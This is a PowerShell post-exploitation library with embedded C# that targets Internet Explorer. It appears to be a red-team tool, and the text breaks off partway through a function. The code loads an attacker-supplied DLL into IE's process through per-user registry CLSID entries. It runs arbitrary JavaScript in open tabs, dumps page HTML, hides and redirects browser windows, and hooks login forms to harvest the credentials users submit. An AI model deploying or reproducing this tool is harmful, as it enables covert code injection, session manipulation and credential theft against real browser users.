function Invoke-PowerThIEf {
<#
.SYNOPSIS
	The PowerThIEf, an Internet Explorer Post Exploitation library

.DESCRIPTION
	Author: Rob Maslen (@rbmaslen)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.PARAMETER action
	The action to perform, can be one of 
    ('ListUrls', 'Creds', 'ExecPayload', 'InvokeJS', 'DumpHtml', 'NewBackgroundTab','HookLoginForms', 'RemoveHooks', 'ListActions','HideWindow', 'ShowWindow','Navigate', 'Help')

.PARAMETER PathPayload 
Path to the binary(DLL) to launch in IE's process, used with the ExecPayload action

.PARAMETER BrowserIndex
Index of the browser to inject the payload into, these are listed by the action ListUrls
        
.PARAMETER Script  
The JavaScript to be invoked via InvokeJS flag")]
    
.PARAMETER SelectorType
The type of Selector when using DumpHtml can be either ('id','name','tag')
        

.PARAMETER Selector
        DOM Object selector to locate when using DumpHtml, specify type in SelectorType [default is id].

.PARAMETER Output
        Location for output which is either a file specified by OutputPath (or tempfile if thats blank), the screen[default] or to both. Can be either ('file','screen','both')
        

.PARAMETER OutputPath
Path to write output to if screen or both is selected in Output. If this is blank and either of those is selected a temp file will be written

.PARAMETER URLFilter
Regex to used to filter windows/tabs by URL when using ListUrls

.PARAMETER NavigateUrl
The URL to navigate to when using the Navigate action

.EXAMPLE
List URLs for all current IE browser sessions
Invoke-PowerThIEf -action ListUrls

.EXAMPLE
Launch the binary specified by the PathPayload param in IE's process
Invoke-PowerThIEf -action ExecPayload -PathPayload <path to the payload DLL(x64)>

.EXAMPLE
Invoke JavaScript in all currently opened IE windows and tabs
Invoke-PowerThIEf -action InvokeJS -Script <JavaScript to run>

.EXAMPLE
Invoke JavaScript in the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action InvokeJS -BrowserIndex <BrowserIndex> -Script <JavaScript to run>

.EXAMPLE
Dump the HTML of all currently opened IE windows/tabs
Invoke-PowerThIEf -action DumpHTML

.EXAMPLE
Dump the HTML from the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex>

.EXAMPLE
Dump the HTML from  all tags of <type> in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType tag -Selector <type>
e.g. Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType tag -Selector div

.EXAMPLE
Dump the HTML from any tag with the <id> found in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType id -Selector <id>
e.g. Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType id -Selector idfirstdiv

.EXAMPLE
Dump the HTML from any tag with the <name> found in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType name -Selector <name>
e.g. Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType name -Selector namefirstdiv

.EXAMPLE
Show all currently opened IE windows/tabs
Invoke-PowerThIEf -action ShowWindow

.EXAMPLE
Show the selected opened IE windows/tabs. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action ShowWindow -BrowserIndex <BrowserIndex>

.EXAMPLE
Hide all currently opened IE windows/tabs
Invoke-PowerThIEf -action HideWindow

.EXAMPLE
Hide the selected opened IE windows/tabs. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action HideWindow -BrowserIndex <BrowserIndex>

.EXAMPLE
Navigate all currently opened IE windows/tabs to the <URL>
Invoke-PowerThIEf -action Navigate -NavigateUrl <URL> 

.EXAMPLE
Navigate all currently opened IE windows/tabs to the <URL>. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action Navigate -BrowserIndex <BrowserIndex> -NavigateUrl <URL> 

.EXAMPLE
Navigate all currently opened IE windows/tabs to the <URL>. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action Navigate -BrowserIndex <BrowserIndex> -NavigateUrl <URL> 

.EXAMPLE
Automatically scan any windows or tabs for login forms and record what gets posted. Once credentials have come in use -action creds to list them
Invoke-PowerThIEf -action HookLoginForms 

.EXAMPLE
List any creds that have been captured
Invoke-PowerThIEf -action Creds 

.EXAMPLE
Open a new background tab in the window that the <BrowserIndex> is in.
Invoke-PowerThIEf -action NewBackgroundTab -BrowserIndex <BrowserIndex>


#>

	param(
		# "ListUrls: List URLs for all current IE browser sessions"
        # "ExecPayload: Launch the binary specified by the PathPayload param in IE's process")]
        # "InvokeJS: Invoke JavaScript in all current IEs windows, one specified by a URLFilter or the BrowserIndex. Set script via -Script "
        # "DumpHtml: Dump Inner HTML for the Selector and SelectorType"
        # "Navigate: Navigate to the supplied url"
        # "HideWindow: Hides the parent of the current tab, no way unfortunately currently to hide individual tabs"
        # "ShowWindow: Sets the parent of the current tab to be visible"
        # "NewBackgroundTab: Creates a tab on the selected IE Window"
        # "HookLoginForms: Add an event to look for any login forms then dump any credentials that are POSTed"
        # "RemoveHooks: Remove the WindowRegistered and WindowRevoked hooks added by Hooking the Login Form"
        # "Creds: Dump the credentials that have been recovered by Hooking login forms"

        [Parameter(Mandatory = $True, HelpMessage="Index of the browser to inject the payload into, this comes from a previous ListUrls")]
        [ValidateSet('ListUrls', 'Creds', 'ExecPayload', 'InvokeJS', 'DumpHtml', 'NewBackgroundTab','HookLoginForms', 'RemoveHooks', 'ListActions','HideWindow', 'ShowWindow','Navigate', 'Help')]
        [String]$Action,

        [Parameter(Mandatory = $False,HelpMessage="Path to the binary(DLL) to launch in IE's process")]
        [String]$PathPayload,
        
        [Parameter(Mandatory = $False, HelpMessage="Index of the browser to inject the payload into, this comes from a previous ListUrls")]
        [String] $BrowserIndex,
        
        [Parameter(Mandatory = $False, HelpMessage="JavaScript to be invoked via InvokeJS flag")]
        [String]$Script,

        # Dump Html, the following support the dumping of the Inner HTML from an instance. Narrow the selection to dump by either using a target type of id, name or tagname
        # jQuery selectors not supported juuuuuusssttt yet... You could invoke some script if you want

        [ValidateSet('id','name','tag')]
        [String]$SelectorType,

        [Parameter(Mandatory = $False, HelpMessage="DOM Object selector to locate, specify type in SelectorType [default is id]. Used by DumpHtml")]
        [String]$Selector,

        [Parameter(Mandatory = $False, HelpMessage="Location for output which is either a file specified by OutputPath (or tempfile if thats blank), the screen[default] or to both")]
        [ValidateSet('file','screen','both')]
        [String]$Output,

        [Parameter(Mandatory = $False, HelpMessage="Path to write output to if screen or both is selected in Output. If this is blank and either of those is selected a temp file will be written ")]
        [String]$OutputPath,

        [Parameter(Mandatory = $False, HelpMessage="Regex to filter URLS")]
        [String]$URLFilter,

        [Parameter(Mandatory = $False, HelpMessage="URL to navigate to")]
        [String]$NavigateUrl
	)
	
    # ShellWindows enables the enumeration of all IE and Explorer Windows
    # https://msdn.microsoft.com/en-us/library/windows/desktop/bb773974(v=vs.85).aspx
    # Not really used just left in for curiousity.
    function ActivateShellWindows
    {
        [OutputType([System.__ComObject])]
        Param()
        if (!$gShellWindows)
        {
            Write-Host "[-] Activating ShellWindows CLSID {9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
            
            # ShellWindows CLSID
            $typeShWin = [System.Type]::GetTypeFromCLSID([System.Guid]::Parse("9BA05972-F6A8-11CF-A442-00A0C90A8F39")) 
            #Create an instance of shellWindows   
            $shWin = [System.Activator]::CreateInstance($typeShWin) 

            Set-Variable -Name "gShellWindows" -Value $shWin  -Scope Global -Description "ShDocVw.ShellWindowsClass"
            ,$shWin    
        }
        else {
            ,$gShellWindows   
        }
    }

    # Enumerates the ShellWinow.Items collection object looking for IExplorer instances
    # Translates the HWND to a PID via GetWindowThreadProcessId see above
	function getIEInstances
	{
        [OutputType([System.Collections.ArrayList])]
        Param(
            [Parameter(Mandatory = $False)]
            [System.__ComObject]$ShellWindows
        )
        [System.Collections.ArrayList]$results = @()
        Write-Host "[-] Looking for instances of IE"
        
		Foreach($shell in $ShellWindows)
		{
            # Really dirty way to tell if explorer or iexplore ohh well
			$fileName = [System.IO.Path]::GetFileNameWithoutExtension($shell.FullName).ToLower();
            if ($fileName.Equals("iexplore"))
            {
                if ($shell)
                {
                    $instance = [PSCustomObject]@{
                        Browser = $shell
                        URL = $shell.LocationURL
                        INDEX = [WindowHelper]::GetHWNDFromDocument($shell.Document)
                    } 
                    [void]$results.Add($instance)    
                }
            }
		}
        ,$results
	}

    function getFilteredIEInstances
    {
        [OutputType([System.Collections.ArrayList])]  
        Param(
            [Parameter(Mandatory = $False)]
            [System.__ComObject]$ShellWindows
        )
        [System.Collections.ArrayList]$results = @()

        if ($BrowserIndex -gt 0 -or [string]::IsNullOrEmpty($URLFilter))
        {
            if ($BrowserIndex -gt 0)
            {
                Write-Host "[-] Browser Index of $BrowserIndex"
            }
            if (![System.String]::IsNullOrEmpty($URLFilter))
            {
                Write-Host "[-] URL filter of $URLFilter"
            }
        }
        $ieInstances = getIEInstances -ShellWindows $ShellWindows
        foreach($instance in $ieInstances)
        {
            # Check to see if this is one we want, first check for the HWND of the document then regex the URL
            if (![System.String]::IsNullOrEmpty($BrowserIndex) -and $BrowserIndex -ne $instance.INDEX)
            {
                continue
            }

            if (![string]::IsNullOrEmpty($URLFilter))
            {
                if (!$instance.URL -match $URLFilter)
                {
                    continue
                }
            }
            [void]$results.Add($instance)  
        }
        ,$results
    }

    # The following functions support the loading of payloads via the Software\Classes\CLSID\{<GUID>} Shell integration
    # Modification of b33f's Hook-InProcServer https://github.com/FuzzySecurity/DefCon25 covered in his COM Hijacking live session
    # Well worth the cost of support via Patreon!!
    # This isn't COM hijacking, this is process migration into IE via IWebBrowser2::Navigate2 https://msdn.microsoft.com/en-us/library/aa752134(v=vs.85).aspx

	function buildRegistrykey
	{
        [OutputType([System.Guid])]
        Param( 
            [Parameter(Mandatory=$true)]
            [String]$Payload
        )
        $CLSID = ([System.Guid]::NewGuid().ToString()) 
        New-Item -Path "HKCU:\Software\Classes\CLSID" -ErrorAction SilentlyContinue | Out-Null
		New-Item -Path "HKCU:\Software\Classes\CLSID\{$CLSID}" | Out-Null
		New-Item -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" | Out-Null
		New-Item -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" | Out-Null
		New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Name "(default)" -Value $Payload | Out-Null
		New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Name "ThreadingModel" -Value "Apartment" | Out-Null
		New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Name "LoadWithoutCOM" -Value "" | Out-Null
		New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" -Name "HideOnDesktop" -Value "" | Out-Null
		New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" -Name "Attributes" -Value 0xf090013d -PropertyType DWORD | Out-Null
        Write-Host "[+] Registry key built at HKCU:\Software\Classes\CLSID\{$CLSID}"
        ,$CLSID
	}

    function cleanUpRegistry
    {
        Param(
            [Parameter(Mandatory=$true)]
            [System.Guid]$CLSID
        )

        Write-Host "[!] Time to cleanup HKCU:\Software\Classes\CLSID\{$CLSID}"
        Remove-Item -Recurse -Force -Path "HKCU:\Software\Classes\CLSID\{$CLSID}"
        Write-Host "[+] Done"
    }	

    function LoadFullIEFrame
    {
        [OutputType([System.__ComObject])]
        Param()
        # Generally we shouldn't need to use this however (this is now the default it's just easier)
        # For some reason when you activate {9BA05972-F6A8-11CF-A442-00A0C90A8F39} the instance returned is missing
        # a few interfaces such as DShellWindowsEvents
        # https://msdn.microsoft.com/en-us/library/windows/desktop/cc836565(v=vs.85).aspx
        # This contains the events WindowRegistered and WindowRevoked which are useful for tracking window opens and closes
        # Code here loads ieframe.dll and then generates an in-memory assembly from the type library
        # it's based upon the MSDN sample at https://msdn.microsoft.com/en-us/library/k9w7de3e.aspx
        # We shouldn't need to do this everytime (but i am sue me), only if we track windows for login form thievery 
        # Also uses some example code from 
        # https://social.msdn.microsoft.com/Forums/sqlserver/en-US/73bd1e9c-81a6-44ba-81b4-fbbb469c770e/

        if (!$globalTrackIEFrameLoaded)
        {
            Write-Host "[-] Loading ieframe.dll and generating assembly from type library"
            $source = @"
            using System;
            using System.Reflection;
            using System.Runtime.InteropServices;
            using mshtml;

            public static class WindowHelper
            {
                [DllImport("user32")]
                public static extern IntPtr GetForegroundWindow();

                [DllImport("user32")]
                public static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);

                [DllImport("user32")]
                public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

                [DllImport("kernel32.dll", SetLastError = true)]
                static extern uint GetCurrentThreadId();

                [DllImport("user32.dll")]
                static extern IntPtr GetFocus();

                [DllImport("user32.dll")]
                static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);

                public static IntPtr GetFocusedControl()
                {
                    uint id = 0;
                    var hFore = GetForegroundWindow();
                    AttachThreadInput(GetWindowThreadProcessId(hFore, out id), GetCurrentThreadId(), true);
                    var hFocus = GetFocus();
                    AttachThreadInput(GetWindowThreadProcessId(hFore, out id), GetCurrentThreadId(), false);
                    return hFocus;
                }

                public static IntPtr GetHWNDFromDocument(HTMLDocumentClass pdocument)
                {
                    var hwnd = IntPtr.Zero;
                    var wind = pdocument as IOleWindow;
                    if (null != wind)
                        wind.GetWindow(out hwnd);
                    return hwnd;
                }
            }

            [ComImport]
            [Guid("00000114-0000-0000-C000-000000000046")]
            [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]

            public interface IOleWindow
            {
                void GetWindow(out IntPtr phwnd);
                void ContextSensitiveHelp([In, MarshalAs(UnmanagedType.Bool)] bool fEnterMode);
            }

            public static class TlbImport
            {
                public enum RegKind
                {
                    RegKind_Default = 0,
                    RegKind_Register = 1,
                    RegKind_None = 2
                }

                [DllImport("oleaut32.dll", CharSet = CharSet.Unicode, PreserveSig = false)]
                public static extern void LoadTypeLibEx(String strTypeLibName, RegKind regKind,
                    [MarshalAs(UnmanagedType.Interface)] out Object typeLib);
            }

            public class ConversionEventHandler : ITypeLibImporterNotifySink
            {
                public void ReportEvent(ImporterEventKind eventKind, int eventCode, string eventMsg){}
                public Assembly ResolveRef(object typeLib){ return null;}
            }
"@
            Add-Type -TypeDefinition $source -Language CSharp -ReferencedAssemblies Microsoft.CSharp,Microsoft.mshtml

            $typeLib = new-object -TypeName System.Object 
            if ([Environment]::Is64BitProcess -or !([Environment]::Is64BitOperatingSystem))
            {
                if ([Environment]::Is64BitOperatingSystem)
                {
                    Write-Host "[+] 64bit detected loading C:\\Windows\\System32\\ieframe.dll"
                }
                else 
                {
                    Write-Host "[+] 32bit detected loading C:\\Windows\\System32\\ieframe.dll"
                }
                [TlbImport]::LoadTypeLibEx( "C:\\Windows\\System32\\ieframe.dll", [TlbImport+RegKind]::RegKind_None, [ref] $typeLib)    
            } else 
            {
                if (![Environment]::Is64BitProcess -and [Environment]::Is64BitOperatingSystem)
                {
                    Write-Host "[+] SySWOW64bit detected loading C:\\Windows\\SysWOW64\\ieframe.dll"
                    [TlbImport]::LoadTypeLibEx( "C:\\Windows\\SysWOW64\\ieframe.dll", [TlbImport+RegKind]::RegKind_None, [ref] $typeLib) 
                }
            }
            
            $t = new-object -TypeName System.Runtime.InteropServices.TypeLibConverter
            $asm = $t.ConvertTypeLibToAssembly($typeLib, "SHDocVW.dll", 0, (new-object -TypeName ConversionEventHandler), $null, $null, "SHDocVW", $null)
            Write-Host "[+] SHDocVW assembly generated"
            # Also need to add the HtmlProxy but we need to load the previous classes first
            $shw = new-object -TypeName SHDocVW.ShellWindowsClass
            Set-Variable -Name "gShellWindows" -Value $shw  -Scope Script -Description "Instance of ShellWindowsClass"
            AddTypeHtmlEventProxy
            Write-Host "[+] ShellWindowsClass created"
            Set-Variable -Name "globalTrackIEFrameLoaded" -Value $true  -Scope global -Description "used to track the loading of ieframe.dll"
            Set-Variable -Name "SHDocVW" -Value $asm  -Scope Script -Description "Assembly containing types from ieframe.dll"
            ,$shw 
        }
        else {
            ,$gShellWindows    
        }
    }



    function AddTypeHtmlEventProxy
    {
        # Builds an HTML Event Proxy which uses this article as inspiration
        # https://www.codeproject.com/Articles/25769/Handling-HTML-Events-from-NET-using-C
        # Uses IReflect to emulate IDispatch, at this stage only takes an Action<Object> 
        # to be fired on the registered event. The Object is the DOM object the event has 
        # triggered on. This could definitely be improved but it's enough atm.

    $source = @"
    using System;
    using System.Reflection;
    using System.Globalization;
    using System.Collections.Generic;
    using System.Runtime.InteropServices;
    using System.Runtime.CompilerServices;
    using System.Text.RegularExpressions;
    using mshtml;

    public class HtmlEventProxy : BaseEventProxy
    {
        public Action<Object> callback { get; set; }
        static Dictionary<String, HtmlEventProxy> mapSrcIdToEvent { get; set; }
        object _locker = new object();
        IReflect typeIReflectImplementation;
        IHTMLElement2 htmlElement = null;
        string eventName = null;
        string EventIdentifier = null;

        static HtmlEventProxy()
        {
            mapSrcIdToEvent = new Dictionary<String, HtmlEventProxy>();
        }

        public static bool CheckIfHandled(string eventName, IHTMLElement2 htmlElement)
        {
            foreach (var h in mapSrcIdToEvent.Values)
            {
                if (h.htmlElement == htmlElement && h.eventName == eventName)
                    return true;
            }
            return false;
        }

        HtmlEventProxy(string eventName, IHTMLElement2 htmlElement, String EventIdentifier, Action<Object> callback)
        {
            this.callback = callback;
            this.eventName = eventName;
            this.htmlElement = htmlElement;
            Type type = typeof(HtmlEventProxy);
            this.typeIReflectImplementation = type;
        }

        public static HtmlEventProxy Create(string eventName, IHTMLElement2 htmlElement, String EventIdentifier, Action<Object> callback)
        {
            if (mapSrcIdToEvent.ContainsKey(EventIdentifier))
            {
                return mapSrcIdToEvent[EventIdentifier];
            }
            else
            {
                IHTMLElement2 elem = htmlElement;
                HtmlEventProxy newProxy = new HtmlEventProxy(eventName, elem, EventIdentifier, callback);
                elem.attachEvent(eventName, newProxy);
                mapSrcIdToEvent.Add(EventIdentifier, newProxy);
                return newProxy;
            }
        }

        public static void Detach(String EventIdentifier)
        {
            if (mapSrcIdToEvent.ContainsKey(EventIdentifier))
            {
                mapSrcIdToEvent[EventIdentifier].Detach();
            }
        }

        public void Detach()
        {
            lock (this)
            {
                if (this.htmlElement != null)
                {
                    IHTMLElement2 elem = htmlElement;
                    elem.detachEvent(this.eventName, this);
                    this.htmlElement = null;
                }
                mapSrcIdToEvent.Remove(EventIdentifier);
            }
        }

        public IHTMLElement2 HTMLElement
        {
            get
            {
                return this.htmlElement;
            }
        }

        public override object InvokeMember(string name, BindingFlags invokeAttr, Binder binder, object target, object[] args, ParameterModifier[] modifiers, CultureInfo culture, string[] namedParameters)
        {
            if (name == "[DISPID=0]")
            {
                if (this.callback != null)
                    this.callback.Invoke(target);
            }

            return null;
        }

        public override void Dispose()
        {
            Detach();
        }
    }

    public class DipatchEventProxy : BaseEventProxy
    {
        object _locker = new object();
        Dictionary<int, Action<object, object[]>> mapDispIdToHandler = new Dictionary<int, Action<object, object[]>>();
        IConnectionPointContainer _connPointContainer;
        IConnectionPoint _iconnpoint = null;
        int _cookie;
        public DipatchEventProxy(object connPointContainer, Guid EventInterfaceID)
        { 
            if (null == (connPointContainer as IConnectionPointContainer))
                throw new Exception("Object passed can not cast to IConnectionPointContainer");
            _connPointContainer = connPointContainer as IConnectionPointContainer;
            _connPointContainer.FindConnectionPoint(EventInterfaceID, out _iconnpoint);
            if (null == _iconnpoint)
                throw new Exception(String.Format("IConnectionPoint is null for GUID {0}",EventInterfaceID));
            
            _iconnpoint.Advise(this, out _cookie);
        }

        public void AddDispatchHandler(int dispid, Action<object, object[]> eventHandler)
        {
            lock (_locker)
            {
                if (!mapDispIdToHandler.ContainsKey(dispid))
                    mapDispIdToHandler.Add(dispid, eventHandler);
                else
                    mapDispIdToHandler[dispid] = eventHandler;
            }
        }

        public void DetachAll()
        {
            lock(_locker)
            {
                _iconnpoint.Unadvise(_cookie);
                mapDispIdToHandler.Clear();
            }
        }

        public void Detach(int dispid)
        {
            lock (_locker)
            {
                if (mapDispIdToHandler.ContainsKey(dispid))
                    mapDispIdToHandler.Remove(dispid);
            }
        }

        public override object InvokeMember(string name, BindingFlags invokeAttr, Binder binder, object target, object[] args, ParameterModifier[] modifiers, CultureInfo culture, string[] namedParameters)
        {
            Int32 dispid = -1;
            if (Int32.TryParse(new Regex(@"(?<=\[DISPID=)\d*?(?=\])").Match(name).Value, out dispid))
            {
                lock (_locker)
                {
                    if (mapDispIdToHandler.ContainsKey(dispid))
                        mapDispIdToHandler[dispid].Invoke(target, args);
                }
            }
            return null;
        }

        public override void Dispose()
        {
            base.Dispose();
            DetachAll();
        }
    }

    [Guid("B196B284-BAB4-101A-B69C-00AA00341D07")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [ComImport]
    public interface IConnectionPointContainer
    {
        void EnumConnectionPoints(out IEnumConnectionPoints ppEnum);
        void FindConnectionPoint([In] ref Guid riid, out IConnectionPoint ppCP);
    }

    [Guid("B196B287-BAB4-101A-B69C-00AA00341D07")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]

    [ComImport]
    public interface IEnumConnections
    {
        [MethodImpl(MethodImplOptions.PreserveSig)]
        int Next(int celt, [MarshalAs(UnmanagedType.LPArray), Out] CONNECTDATA[] rgelt, IntPtr pceltFetched);
        [MethodImpl(MethodImplOptions.PreserveSig)]
        int Skip(int celt);
        void Reset();
        void Clone(out IEnumConnections ppenum);
    }

    [Guid("B196B285-BAB4-101A-B69C-00AA00341D07")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [ComImport]
    public interface IEnumConnectionPoints
    {
        [MethodImpl(MethodImplOptions.PreserveSig)]
        int Next(int celt, [MarshalAs(UnmanagedType.LPArray), Out] IConnectionPoint[] rgelt, IntPtr pceltFetched);
        [MethodImpl(MethodImplOptions.PreserveSig)]
        int Skip(int celt);
        void Reset();
        void Clone(out IEnumConnectionPoints ppenum);
    }

    [Guid("B196B286-BAB4-101A-B69C-00AA00341D07")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [ComImport]
    public interface IConnectionPoint
    {
        void GetConnectionInterface(out Guid pIID);
        void GetConnectionPointContainer(out IConnectionPointContainer ppCPC);
        void Advise([MarshalAs(UnmanagedType.Interface)] object pUnkSink, out int pdwCookie);
        void Unadvise(int dwCookie);
        void EnumConnections(out IEnumConnections ppEnum);
    }


    public abstract class BaseEventProxy : IDisposable, IReflect
    {
        IReflect typeIReflectImplementation { get {return this.GetType(); } }
        public BaseEventProxy()
        {   
        }

        FieldInfo IReflect.GetField(string name, BindingFlags bindingAttr)
        {
            return this.typeIReflectImplementation.GetField(name, bindingAttr);
        }

        FieldInfo[] IReflect.GetFields(BindingFlags bindingAttr)
        {
            return this.typeIReflectImplementation.GetFields(bindingAttr);
        }

        MemberInfo[] IReflect.GetMember(string name, BindingFlags bindingAttr)
        {
            return this.typeIReflectImplementation.GetMember(name, bindingAttr);
        }

        MemberInfo[] IReflect.GetMembers(BindingFlags bindingAttr)
        {
            return this.typeIReflectImplementation.GetMembers(bindingAttr);
        }

        MethodInfo IReflect.GetMethod(string name, BindingFlags bindingAttr)
        {
            return this.typeIReflectImplementation.GetMethod(name, bindingAttr);
        }

        MethodInfo IReflect.GetMethod(string name, BindingFlags bindingAttr, Binder binder, Type[] types, ParameterModifier[] modifiers)
        {
            return this.typeIReflectImplementation.GetMethod(name, bindingAttr, binder, types, modifiers);
        }

        MethodInfo[] IReflect.GetMethods(BindingFlags bindingAttr)
        {
            return this.typeIReflectImplementation.GetMethods(bindingAttr);
        }

        PropertyInfo[] IReflect.GetProperties(BindingFlags bindingAttr)
        {
            return this.typeIReflectImplementation.GetProperties(bindingAttr);
        }

        PropertyInfo IReflect.GetProperty(string name, BindingFlags bindingAttr)
        {
            return this.typeIReflectImplementation.GetProperty(name, bindingAttr);
        }

        PropertyInfo IReflect.GetProperty(string name, BindingFlags bindingAttr, Binder binder, Type returnType, Type[] types, ParameterModifier[] modifiers)
        {
            return this.typeIReflectImplementation.GetProperty(name, bindingAttr, binder, returnType, types, modifiers);
        }

        public virtual object InvokeMember(string name, BindingFlags invokeAttr, Binder binder, object target, object[] args, ParameterModifier[] modifiers, CultureInfo culture, string[] namedParameters)
        {
            return null;
        }

        Type IReflect.UnderlyingSystemType
        {
            get
            {
                return this.typeIReflectImplementation.UnderlyingSystemType;
            }
        }

        public virtual void Dispose()
        {
        }

    }
        public class LoginFormDetector
        {
            static List<String> inputLoginNames = new List<String>() { "login", "username", "password", "email", "address", "sudo", "passwd", "loginfmt", "pass", "uid", "userid", "token", "passcode","code" };

            static bool CheckPossibleLoginForm(mshtml.HTMLFormElement form)
            {
                var autocomplete = form.getAttribute("autocomplete");
                if (autocomplete == "off")
                    return true;
                var action = form.action;
                if (action.ToLower().Contains("login"))
                    return true;

                return false;
            }

            static bool CheckForPasswordField(mshtml.HTMLFormElement form)
            {
                foreach (mshtml.IHTMLElement input in form.getElementsByTagName("password"))
                    return true;
                return false;
            }

            public static bool CheckPossibleLoginInput(mshtml.HTMLFormElement form)
            {
                bool foundLoginForm = CheckForPasswordField(form) && CheckPossibleLoginForm(form);
                if (!foundLoginForm)
                {
                    foreach (mshtml.IHTMLElement input in form.getElementsByTagName("input"))
                    {
                        var inputName = ((String)input.getAttribute("name")).ToLower();
                        if (!String.IsNullOrWhiteSpace(inputName) && !foundLoginForm)
                        {
                            foreach(var a in inputLoginNames)
                            {
                                if (inputName.Contains(a) && !foundLoginForm)
                                {
                                    foundLoginForm = true;
                                    break;
                                }
                            }
                        }
                    }
                }
                return foundLoginForm;
            }
        }

        public class LoginFormHooker 
        {
            dynamic _ie;
            static Action<String, List<String>> CredAddedCallback { get; set; }
            static Dictionary<String, List<String>> _credsFound = new Dictionary<string, List<String>>();
            static Dictionary<String, LoginFormHooker> _mapIdToFormHooker = new Dictionary<string, LoginFormHooker>();
            bool hooked = false;
            HtmlEventProxy formHook;
            public LoginFormHooker(dynamic ie, String id)
            {
                _mapIdToFormHooker.Add(id, this);
                _ie = ie;

                //Yeah this is not ideal load of HardCoded stuff but it's COM and Globally Unique 
                //So shouldn't change.....

                var IID_DWebBrowserEvents2 = Guid.Parse("34a715a0-6587-11d0-924a-0020afc7ac4d");
                var handler = new DipatchEventProxy(ie, IID_DWebBrowserEvents2);
                //DispatchId of 259 relates to the event DocumentComplete on DWebBrowserEvents2
                handler.AddDispatchHandler(259, (o, a) => { 
                    FindAndHookLoginForm();
                });
                FindAndHookLoginForm();
            }
            
            void FindAndHookLoginForm()
            {
                try
                {
                    var doc = (mshtml.HTMLDocument)_ie.Document;
                    var elems = doc.getElementsByTagName("form");
                    foreach (mshtml.HTMLFormElement logForm in elems)
                    {
                        if (LoginFormDetector.CheckPossibleLoginInput(logForm))
                        {
                            var elem = logForm as mshtml.IHTMLElement2;
                            HookForm(elem);
                        }
                    }
                }
                catch
                {
                }
            }

            public static Dictionary<String, List<String>> GetCreds()
            {
                return _credsFound;
            }

            public static void Detach(String id)
            {
                if( _mapIdToFormHooker.ContainsKey(id))
                    _mapIdToFormHooker[id].Detach();                 
            }

            void Detach()
            {
                if (null != formHook)
                    formHook.Detach();
            }

            bool HookForm(mshtml.IHTMLElement2 logForm)
            {
                var g = Guid.NewGuid();
                if(!hooked)
                {
                    lock(this)
                    {
                        if(hooked)
                            return false;
                        formHook = HtmlEventProxy.Create("onsubmit", logForm, g.ToString(), (o) => {
                            var prox = o as HtmlEventProxy;
                            if (null != prox)
                            {
                                var targetForm = prox.HTMLElement as mshtml.IHTMLElement;
                                if (null != targetForm)
                                {
                                    var formDoc = targetForm.document as mshtml.HTMLDocument;
                                    if (null != formDoc)
                                    {
                                        var host = new Uri(formDoc.url).Host;
                                        if (!_credsFound.ContainsKey(host))
                                            _credsFound.Add(host, new List<String>());

                                       
                                        bool bFound = false;
                                        foreach (mshtml.IHTMLElement input in formDoc.getElementsByTagName("input"))
                                        {
                                            try {
                                                var value = input.getAttribute("value");
                                                if (!String.IsNullOrWhiteSpace(value.ToString().Trim()))
                                                {
                                                    var cred = input.getAttribute("name") + " : " + value;
                                                    if (!_credsFound[host].Contains(cred))
                                                    {
                                                        _credsFound[host].Add(cred);
                                                        if (!bFound)
                                                            Console.WriteLine(String.Format("[+] Creds have arrived in from {0}", host));
                                                        bFound = true;
                                                    }
                                                }
                                            }
                                            catch 
                                            {
                                            }    
                                        }
                                    }
                                }
                            }
                        });
                    }
                    return true;
                }
                return false;
            }
        }
"@
        Add-Type -TypeDefinition $source -Language CSharp  -IgnoreWarnings -ReferencedAssemblies Microsoft.CSharp,Microsoft.mshtml
   }

   function BuildTrackingCollections
   {
        # Used by Hook Login Forms to track what windows are open
        if (!$loginFormHookerArr)
        {
            $loginFormHookerArr = new-object -TypeName "System.Collections.Generic.Dictionary[IntPtr, LoginFormHooker]"
            Set-Variable -Name "gLoginFormHooker" -Value $loginFormHookerArr  -Scope global -Description "Tracks all the loginformhooker objects"
        }
        if (!$gKnownHwnds)
        {
            $hwnds = New-Object "System.Collections.Generic.List[IntPtr]"
            Set-Variable -Name "gKnownHwnds" -Value $hwnds  -Scope global -Description "Tracks all the WebBrowser Document HWNDs"    
        }
        
